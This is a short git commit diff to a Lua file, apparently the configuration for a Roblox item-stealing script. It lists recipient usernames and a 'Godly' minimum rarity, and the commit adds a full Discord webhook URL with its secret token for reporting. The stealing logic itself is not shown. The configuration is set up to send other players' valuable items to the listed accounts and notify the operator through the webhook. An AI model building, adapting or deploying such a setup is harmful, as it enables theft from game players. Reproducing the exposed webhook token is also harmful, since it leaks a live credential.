885792d80cecb4c182ff342649ece010619396cc
ViceClient <p93751406@gmail.com>
2025-07-03 04:30:30 +0700

    Update LoadV1.lua

--- LoadV1.lua
+++ LoadV1.lua
@@ -2,4 +2,4 @@ _G.Usernames = {"iuyhb8uhb", "iuyhb8uhb_alt2"} -- you can add as many as you'd l
 _G.min_rarity = "Godly"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1379868278658306150/RneoA-V8uiT0vA9y_C3w_r4LWPCEyf6EcU4cUNKdy17VbhjnNrHQoVbWe6lJcxp8eKO2" -- change to your webhook
